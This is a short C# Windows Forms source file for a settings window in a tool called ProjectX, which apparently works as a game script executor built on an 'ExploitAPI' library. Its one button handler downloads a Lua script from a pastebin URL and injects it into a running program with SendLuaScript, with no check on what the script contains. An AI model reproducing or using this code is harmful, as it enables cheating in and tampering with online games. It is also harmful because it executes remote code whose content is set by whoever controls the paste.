using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Hovac_API;

namespace ProjectX
{
    public partial class Settings : Form
    {
        ExploitAPI exploitAPI = new ExploitAPI();
        public Settings()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.pl/view/raw/1e857a66");
            exploitAPI.SendLuaScript(Script);
        }
    }
}
